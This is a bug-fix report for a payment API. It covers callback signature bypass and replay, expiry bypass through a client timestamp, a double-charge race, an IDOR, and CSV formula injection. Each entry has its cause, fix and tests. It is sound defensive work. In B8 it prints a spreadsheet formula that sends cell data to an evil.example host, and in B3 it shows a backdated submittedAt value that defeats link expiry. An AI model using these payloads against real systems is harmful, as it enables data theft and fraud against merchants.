# Wave B bug fixes

### B1 Acquirer callbacks are not deduplicated
- Severity: Critical / Ticket: FP-201 / Where: apps/api/src/acquirer/callbacks.ts:37, db/migrations/0051_acquirer_callback_notes.sql
- What is wrong: the same acquirer callback (same `callback_id`) is stored again each time it arrives.
- Why it happens: the insert is a plain `INSERT`. There is no unique index on `callback_id`. The `processed_events` table that CHANGELOG 1.9.0 and the 0051 comment talk about does not exist. `withCallbackRetry` and the acquirer both resend the same callback.
- What it breaks: one fraud verdict is stored as 2, 3 or more notes in `acquirer_callback_notes`. Anyone who reads the notes sees "confirmed fraud" many times and can act on it more than once (for example void or refund twice). Note: no screen shows these notes yet; the code comment that says they are on the transaction timeline is wrong (outside review, claim 7; see [Open risks](../submission/BUGS.md#open-risks)).
- Fix: new migration `0073_acquirer_callback_notes_unique_callback_id.sql` deletes old duplicates (keeps the earliest row) and adds a unique index on `callback_id`. The insert now uses `ON CONFLICT (callback_id) DO NOTHING`, so a resend is a safe no-op and still returns 200.
- Test: apps/api/src/acquirer/callbacks.fix.test.ts "FP-201: a redelivered callback (same callback_id) is recorded once" (sends the same callback 4 times, also in parallel; expects 1 row).
- How found and reproduced: Case card ticket FP-201 and audit round 1 (finding 14): `acquirer_callback_notes` had no unique key, and the `processed_events` table that CHANGELOG 1.9.0 names does not exist. Reproduced by `callbacks.fix.test.ts` "FP-201: a redelivered callback (same callback_id) is recorded once": it sends one callback 4 times, also in parallel; the old code stored a row for each send.
- Effect on existing data: Yes, old rows were wrong. Migration 0073 deletes the duplicate notes and keeps the earliest row per `callback_id`. A void or credit that staff did twice because of a duplicate note is not undone by us; support must check those by hand.

### B2 Acquirer callback signature can be skipped, replayed, and is checked over the wrong bytes
- Severity: Critical / Ticket: FP-240 (inbound part) / Where: apps/api/src/webhooks/inboundVerify.ts:40-70, apps/api/src/config.ts:259, apps/api/src/routes/acquirerCallbacks.ts:57
- What is wrong: four faults in the only auth this public endpoint has.
  1. No signature header = accepted. `ACQUIRER_CALLBACK_REQUIRE_SIGNATURE` defaults to `false`.
  2. The compare uses `Buffer.compare`, which is not constant time.
  3. The HMAC is computed over `JSON.stringify(parsedBody)`, not the bytes the acquirer sent.
  4. The `t=` timestamp is never checked, so an old signed callback can be replayed forever.
- Why it happens: the "optional while the sandbox is not signing" mode was left as the default, and the verifier re-serialises the parsed body instead of using the raw body.
- What it breaks: anyone on the internet can post an unsigned "confirmed_fraud" verdict for any transaction id. A captured callback can be replayed at any time. Real acquirer callbacks with different spacing or key order fail with 401. A timing attack can guess the HMAC byte by byte.
- Fix: default is now `true` (docs/ARCHITECTURE.md updated). Compare uses `crypto.timingSafeEqual`. The callback route keeps the raw request body (a JSON parser scoped to this route only) and the HMAC is over `<t>.<rawBody>`. `t` must be within ±300 s of server time, else 401 `timestamp_out_of_tolerance`. The opt-out env var still exists for local sandbox use.
- Test: apps/api/src/webhooks/inboundVerify.fix.test.ts and apps/api/src/routes/acquirerCallbacks.fix.test.ts (unsigned -> 401, raw-body signature -> 200, stale timestamp -> 401). Existing tests that asserted "unsigned gets 200" now assert 401; their fixed 2025 timestamps now use the current time.
- How found and reproduced: Case card ticket FP-240 (inbound part) and audit round 1 (finding 15), by reading `inboundVerify.ts` and the `false` default in `config.ts`. Reproduced by `acquirerCallbacks.fix.test.ts` and `inboundVerify.fix.test.ts`: an unsigned callback got 200 (now 401), a correct signature over the raw body with other spacing got 401 (now 200), and an old `t=` was accepted (now 401).
- Effect on existing data: Unknown. `acquirer_callback_notes` keeps no signature, so a forged or replayed note cannot be told apart from a real one. To check, compare `SELECT callback_id, transaction_id, outcome, received_at FROM acquirer_callback_notes ORDER BY received_at;` with the acquirer's own callback log. We did not change or delete any rows.

### B3 Expired payment link can be paid by sending an old `submittedAt`
- Severity: Critical / Ticket: FP-187 / Where: apps/api/src/paymentLinks/pay.ts:32-38 and :60, apps/api/src/routes/paymentLinks.ts:157-166
- What is wrong: the expiry check uses a time the client sends (`submittedAt`) instead of the server clock.
- Why it happens: `expiryReferenceTime()` returns the client value if it parses. The pay route is public and unauthenticated, and passes `submittedAt` straight through. The route comment says it is "ignored unless authenticated with an API key", but no such check exists (and the route has no auth at all).
- What it breaks: anyone can pay a link after it expired by sending `"submittedAt": "2000-01-01T00:00:00Z"`. A merchant who set a short expiry on an invoice (for example a price valid for 1 hour) is charged at the old price days later. Expiry has no effect.
- Fix: pay uses the server's time only. `expiryReferenceTime` and the `submittedAt` input are removed from the API; the web checkout no longer sends it. docs/ARCHITECTURE.md said "client clock for offline terminals"; that is updated, because a public route cannot trust a client time and no authenticated terminal path exists.
- Test: apps/api/src/routes/paymentLinks.fix.test.ts "FP-187: an expired link cannot be paid by sending an old submittedAt" (was 200, now 410). apps/api/src/paymentLinks/pay.test.ts is removed: it only tested `expiryReferenceTime`, and its "round-trips exactly" case locked the bug in.
- How found and reproduced: Case card ticket FP-187 and audit round 1 (finding 16), by reading `pay.ts` and the checkout page that sent `submittedAt`. Reproduced by `paymentLinks.fix.test.ts` "FP-187: an expired link cannot be paid by sending an old submittedAt": it pays an expired link with `submittedAt` 2000-01-01; the old code answered 200, now 410.
- Effect on existing data: Links that were paid after expiry stay paid, and we did not reverse any money. To find them: `SELECT id, merchant_id, expires_at, paid_at FROM payment_links WHERE status = 'paid' AND paid_at > expires_at;`. The merchant can refund a payment if needed.

### B4 One payment link charged twice (the real cause of incident 2026-05-14)
- Severity: High / Ticket: incident 2026-05-14 (FP-198) / Where: apps/api/src/paymentLinks/pay.ts:70-76 (claim) and :139-170 (finalize), config.ts:247 (60 s timeout)
- What is wrong: a second payer can take over a link while the first payer's payment is still running. Both cards are captured. The first payer still gets 200 "paid".
- Why it happens: the claim treats a `reserved` link as free again once `reserved_at` is older than 60 s. It does not know whether a payment is still in flight. If authorize + capture take more than 60 s, payer B re-claims, pays and finalizes. Payer A's capture then succeeds too; A's finalize matches 0 rows, the code only logs ("unreachable") and returns 200. The postmortem blamed duplicate callbacks, but callbacks only write notes and never capture. AM's note matches the evidence: every double had a first attempt over 60 s, and 16 of 17 transactions had one callback note.
- What it breaks: two cardholders pay one single-use invoice. The merchant gets money twice, one customer gets a "paid" receipt for a link that shows someone else's transaction. In May this cost BD 1,284.500 in goodwill credits.
- Fix: new column `payment_links.pending_transaction_id` (migration 0081). After authorize, pay.ts binds its authorization to the link, but only if it still holds its own claim (`reserved_at` matches). The timeout re-claim is now allowed only when no authorization is bound (or the bound one was voided). So:
  - slow capture: nobody can take the link; the second payer gets 409 `payment_link_processing`; the first payer finishes and the link is paid once.
  - slow authorize that lost the link: the bind fails, pay.ts voids its own authorization with the existing `voidTransaction` (no money moved yet) and returns 409, not 200.
  - finalize is keyed on the bound transaction; a miss now returns 409, never a false 200.
  - release after a decline only releases this request's own claim.
  - public read shows `processing` while a bound payment is in flight.
  Void is done before capture on purpose: `voidTransaction` only works on `authorized`, and refunds are another team's area. Trade-off: if the process crashes after the bind, the link stays `processing` until support voids that authorization; this is safe (no double charge) instead of self-healing into a second charge.
- Test: apps/api/src/routes/paymentLinks.fix.test.ts "2026-05-14: a slow capture past the reservation timeout cannot be overtaken by a second payer" and "2026-05-14: a payer who lost the reservation during a slow authorize is voided and gets 409, not 200" (both captured twice and returned 200 before the fix).
- How found and reproduced: Incident 2026-05-14 (FP-198): `docs/incidents/postmortem-2026-05.md` and `docs/archive/slack-export-fp-ops-2026-05.txt` show the two captures per link were 60 to 70 s apart, the same as the 60 s reservation timeout; audit round 1 (finding 17) showed the postmortem's callback theory was wrong. Reproduced by two tests in `paymentLinks.fix.test.ts` ("2026-05-14: a slow capture past the reservation timeout ..." and "... a payer who lost the reservation during a slow authorize ..."): with a slow acquirer, the old code captured two cards and returned 200 to both payers.
- Effect on existing data: The May double charges were handled at the time (postmortem: Gamma extras voided; Delta 4 voided and 3 credited, BD 1,284.500). Migration 0081 only adds an empty column; no rows are changed. We did not search for other double-paid links; this query lists candidates: `SELECT pl.id, count(t.id) FROM payment_links pl JOIN transactions t ON t.merchant_id = pl.merchant_id AND t.reference = pl.reference AND t.captured_fils > 0 WHERE pl.status = 'paid' GROUP BY pl.id HAVING count(t.id) > 1;`

### B5 Merchant A can cancel merchant B's payment link (IDOR)
- Severity: High / Ticket: none / Where: apps/api/src/paymentLinks/cancel.ts:13-28, apps/api/src/routes/paymentLinks.ts:96-106
- What is wrong: `DELETE /v1/merchants/:merchantId/payment-links/:id` cancels any link with that id, from any merchant.
- Why it happens: `assertOwnMerchant` only checks that the caller owns the merchant id in the path. `cancelPaymentLink` then runs `UPDATE ... WHERE id = $1` with no `merchant_id` filter. So a caller puts their own merchant id in the path and another merchant's link id at the end.
- What it breaks: any merchant (or a leaked API key of any merchant) can cancel a competitor's open invoices. Customers then see "canceled" and cannot pay. Link ids leak through logs, support tickets and webhooks.
- Fix: the route passes the path merchant (already checked to be the caller) to `cancelPaymentLink`, and both the UPDATE and the error lookup add `AND merchant_id = $2`. Another merchant's link is now 404, same as a missing link (does not reveal that it exists).
- Test: apps/api/src/routes/paymentLinks.fix.test.ts "B5: merchant B cannot cancel merchant A's payment link (404, link stays active)" (was 204 and the link was canceled).
- How found and reproduced: Audit round 1 (finding 20, "IDOR"), by reading `cancel.ts`: the UPDATE has no `merchant_id` filter. Reproduced by `paymentLinks.fix.test.ts` "B5: merchant B cannot cancel merchant A's payment link": merchant B sends DELETE with its own merchant id and A's link id; the old code answered 204 and canceled the link, now 404.
- Effect on existing data: A link canceled this way stays canceled. `payment_links` does not record who canceled a link, so the database cannot show which cancels were wrong. We did not change any rows; the merchant can create a new link.

### B6 Large transactions CSV export loads everything into memory; the unused streaming version drops rows
- Severity: High / Ticket: large export / Where: apps/api/src/transactions/exportCsv.ts:31-85, apps/api/src/routes/transactions.ts:161
- What is wrong:
  1. The route calls `buildTransactionsExportCsv`, which reads every matching row with one query and builds the whole CSV as one string.
  2. `streamTransactionsExportCsv` exists but is unused, and its paging is wrong: the next page starts at `occurred_at > last occurred_at`. Rows that share the last timestamp are skipped. It also keeps the cursor as a JS Date (milliseconds) while Postgres stores microseconds.
  3. An invalid `from`/`to` (for example `from=not-a-date`) becomes `Invalid Date`, Postgres rejects it, and the client gets 500.
- Why it happens: the streaming version was written but never wired in, and its keyset has no tie-breaker column.
- What it breaks: a merchant exporting a year of data makes the API hold every row plus the full CSV in memory. On the 512 MB API container this can kill the process for all merchants. Switching to the old stream as-is would lose data: with 1500 rows at the same timestamp it exported only 1000 (checked on the old code), so finance reconciliation would silently miss transactions.
- Fix: the export is an async generator that pages 1000 rows at a time with keyset `(occurred_at, id) > (cursor)` and `ORDER BY occurred_at, id` (matches index `idx_transactions_merchant_occurred`). The cursor uses `occurred_at::text`, so no precision loss. The route sends it with `Readable.from(...)`, which respects backpressure and stops on client disconnect. `buildTransactionsExportCsv` is now a thin wrapper over the stream (same output), so the existing tests cover the real path. Bad `from`/`to` returns 400 `invalid_request`.
- Test: apps/api/src/transactions/exportCsv.fix.test.ts: "B6: streaming export returns every row once when many rows share one occurred_at", "B6: GET /v1/transactions/export returns all rows across pages", "B6: an invalid from/to is a 400, not a 500" (was 500).
- Note: the list route `GET /v1/transactions` parses `from`/`to` the same way and likely has the same 500; not changed here (outside this bug).
- How found and reproduced: Case card item "large export" and audit round 1 (finding 31), by reading the export route and the unused stream. Reproduced by `exportCsv.fix.test.ts`: 1500 rows with one `occurred_at` gave only 1000 rows from the old stream, and `from=not-a-date` gave 500 (now 400).
- Effect on existing data: None. The export only reads data. The old route used one query, so files exported before were complete; only the unused stream lost rows.

### B7 Capture idempotency ignores which transaction is captured
- Severity: Medium / Ticket: none / Where: apps/api/src/payments/capture.ts:92
- What is wrong: the capture request hash is `hashRequest({ amountFils })`. The transaction id is not in it.
- Why it happens: idempotency keys are unique per merchant + endpoint (`transactions.capture`), not per transaction. Two captures on different transactions with the same key and amount look like the same request.
- What it breaks: a merchant integration that reuses a key (for example the order number, or a fixed key in a retry loop) captures transaction A, then "captures" transaction B with the same key. B is not captured, but the API replays A's 200 response. The merchant believes B was charged and ships the goods; B's authorization later expires and the merchant is never paid.
- Fix: the hash now includes `transactionId`. The same key on another transaction returns 422 `idempotency_key_reused` (the existing rule for a changed request). A true retry on the same transaction still replays. Side effect: a capture retry whose first attempt was stored before this deploy gets 422 once (hash shape changed); it can be retried with a new key.
- Test: apps/api/src/payments/capture.fix.test.ts "B7: the same Idempotency-Key on a different transaction does not replay the first capture" (was 200 replay of transaction A).
- How found and reproduced: Audit round 1 (finding 41), by reading the request hash in `capture.ts`. Reproduced by `capture.fix.test.ts` "B7: the same Idempotency-Key on a different transaction does not replay the first capture": capture A with key K, then B with key K and the same amount; the old code replayed A's 200 and B stayed uncaptured.
- Effect on existing data: A wrongly replayed capture wrote no row, so the database cannot show which transactions were hit. Such a transaction is still authorized and not captured: `SELECT id, merchant_id, amount_fils, created_at FROM transactions WHERE status = 'authorized' AND captured_fils = 0;` lists candidates to check against the merchant's orders. Stored `idempotency_keys` rows keep the old hash shape, so a retry of a capture made before the deploy gets 422 one time.

### B8 CSV formula injection in the transactions export
- Severity: Medium (security) / Ticket: none / Where: apps/api/src/transactions/exportCsv.ts:12 (`csvEscape`)
- What is wrong: the merchant's free-text `reference` goes into the CSV as it is. A value that starts with `=`, `+`, `-`, `@`, tab or CR is not neutralised.
- Why it happens: `csvEscape` only handles commas, quotes and newlines (CSV syntax). It does not think about how Excel or Google Sheets read the cell. They treat a cell that starts with one of those characters as a formula.
- What it breaks: a merchant (or anyone who can set an order reference through the API) sets the reference to `=HYPERLINK("http://evil.example/?x="&A1,"Click")`. Finance downloads the export and opens it in Excel. The cell becomes a live link that can send other cells' data out, or other formulas can run. The attacker controls the data, and a trusted person opens it.
- Fix: `csvEscape` puts a single quote in front of any text cell that starts with `= + - @`, tab or CR (OWASP guidance), and also quotes cells that contain a CR. Only text fields use `csvEscape`. The amount columns come from `formatBhd` and stay plain numbers (`12.345`). Normal references (`order-42`) do not change.
- Test: apps/api/src/transactions/exportCsvInjection.fix.test.ts "B8: formula-like references are prefixed with a quote; amounts and normal references are unchanged".
- How found and reproduced: Our second review on 30 Oct of the export code (not in audit round 1). Reproduced by `exportCsvInjection.fix.test.ts`: a reference `=HYPERLINK(...)` was written into the CSV as is, so Excel reads it as a formula.
- Effect on existing data: None in the database: references stay as the merchant sent them, and the fix acts only when the CSV is written. CSV files already downloaded are not changed. To find risky references: `SELECT id, merchant_id, reference FROM transactions WHERE reference ~ '^[=+@\t\r-]';`

### B9 Ops docs say the settlement daemon falls back to `dev-token`
- Type: Clean-up (docs only). No effect on users, money, data or security in production.
- Severity: Low (docs) / Ticket: none / Where: ops/README.md:73, ops/docker-compose.yml:106
- What is wrong: both say that when `SETTLEMENT_INTERNAL_TOKEN` is not set, the settlement daemon uses `dev-token`, so "nothing extra is needed" for local runs.
- Why it happens: the comments were not updated when the code changed. `apps/settlement/internal/config/config.go` `RequireInternalToken` returns an error when the token is empty, and `cmd/settlement/main.go` calls it for `daemon` and exits. There is no fallback value anywhere in the Go code. FH's note in the compose file already said "it exits at boot without the token for me".
- What it breaks: an operator trusts the doc, leaves the token out of a new environment, and the settlement daemon crash-loops at boot. Or they set the api to `dev-token` to "match", and the api's calls to settlement's internal API fail with 401.
- Fix: the README table and the compose comment now say the token has no default, `daemon` exits without it, one-shot CLI commands do not need it, and it must match the api's value.
- Test: none (docs only). Checked against `config.RequireInternalToken` and `main.go`.
- How found and reproduced: Found by reading `ops/README.md` and `ops/docker-compose.yml` next to `config.RequireInternalToken` and `cmd/settlement/main.go`; FH's note in the compose file already said the daemon exits without the token. No test: docs only.
- Effect on existing data: None: documentation only.
